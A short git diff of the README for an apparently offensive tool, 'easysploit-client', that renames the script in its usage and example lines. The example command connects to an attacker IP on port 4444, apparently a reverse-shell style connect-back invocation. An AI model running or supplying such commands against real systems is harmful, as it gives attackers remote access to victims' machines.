@@ -14,7 +14,7 @@ cd easysploit-client
 
 ## Usage
 ```
-python3 easysploit_client.py <Attacker-IP> <Port> [-a] [-t]
+python3 easysploit.py <Attacker-IP> <Port> [-a] [-t]
 ```
 - `<Attacker-IP>`: Attacker's local IP address.
 - `<Port>`: Listening port on the attacker's machine.
@@ -23,7 +23,7 @@ python3 easysploit_client.py <Attacker-IP> <Port> [-a] [-t]
 
 ## Example
 ```
-python3 easysploit_client.py 192.168.0.1 4444 -a -t
+python3 easysploit.py 192.168.0.1 4444 -a -t
 ```
 
 ## License
